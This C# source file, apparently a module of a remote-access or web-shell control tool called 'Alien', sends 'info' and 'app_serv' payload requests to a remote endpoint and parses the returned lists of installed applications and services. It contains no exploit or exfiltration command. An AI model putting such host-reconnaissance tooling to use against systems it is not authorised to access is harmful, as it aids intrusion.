using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace Alien
{
    public class clsfnInfoSpyder : clsfnBase
    {
        private clsWeb m_web { get; set; }

        public clsfnInfoSpyder(clsWeb web)
        {
            m_web = web;
        }

        public class ApplicationItem
        {
            public string name { get; set; }
            public string version { get; set; }
            public string vendor { get; set; }
            public string installed { get; set; }
            public string source { get; set; }
        }

        public class ServiceItem
        {
            public string name { get; set; }
            public string display_name { get; set; }
            public string status { get; set; }
            public string start_type { get; set; }
            public string source { get; set; }
        }

        public class DataContent
        {
            public List<ApplicationItem> applications { get; set; } = new List<ApplicationItem>();
            public List<ServiceItem> services { get; set; } = new List<ServiceItem>();
        }

        public class clsInfoJson
        {
            public bool success { get; set; }
            public string system_type { get; set; }
            public string os_raw { get; set; }
            public string error { get; set; }
            public DataContent data { get; set; }
        }

        public async Task<string> fnszGetInfo()
        {
            try
            {
                return await m_web.fnszSendPayload("info");
            }
            catch (Exception ex)
            {
                return $"ERROR://{ex.Message}";
            }
        }

        public async Task<clsInfoJson?> fnGetAppServ()
        {
            string szResp = await m_web.fnszSendPayload("app_serv");

            var options = new JsonSerializerOptions
            {
                PropertyNameCaseInsensitive = true
            };

            clsInfoJson? info = JsonSerializer.Deserialize<clsInfoJson>(szResp, options);
            if (info == null)
                throw new Exception("JSON deserialization failed.");

            return info;
        }
    }
}
